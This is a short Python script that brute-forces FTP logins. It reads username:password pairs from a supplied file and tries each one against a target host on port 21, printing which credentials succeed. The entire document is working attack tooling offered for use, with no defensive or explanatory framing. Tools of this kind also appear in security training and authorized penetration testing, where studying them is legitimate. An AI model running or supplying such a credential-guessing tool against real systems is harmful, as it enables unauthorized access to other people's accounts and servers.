#!/usr/bin/python
# -*- coding: utf-8 -*-
import ftplib
from optparse import OptionParser


def ftp_login(hostname, username, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(hostname, 21)
        ftp.login(username, password)
        print('[+] {} FTP Login Succeeded with {}:{}'.format(hostname, username, password))
        ftp.quit()
        return username, password
    except Exception as e:
        pass

    print('[-] Could not brute force FTP credentials {}:{}'.format(username, password))
    return None, None


if __name__ == "__main__":
    parser = OptionParser('usage %prog -H <target host> -F <password lis>')
    parser.add_option('-H', dest='target_host', type=str, help='Specify target host.')
    parser.add_option('-F', dest='password_file', type=str, help='Specify file containing all possible user:passwords combinations.')

    (options, args) = parser.parse_args()

    if options.target_host is None or options.password_file is None:
        print(parser.usage)
        exit(0)

    fn = open(options.password_file, "r")
    for line in fn.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print("[*] Testing: {}:{}".format(username, password))
        ftp_login(options.target_host, username, password)

    print(options)
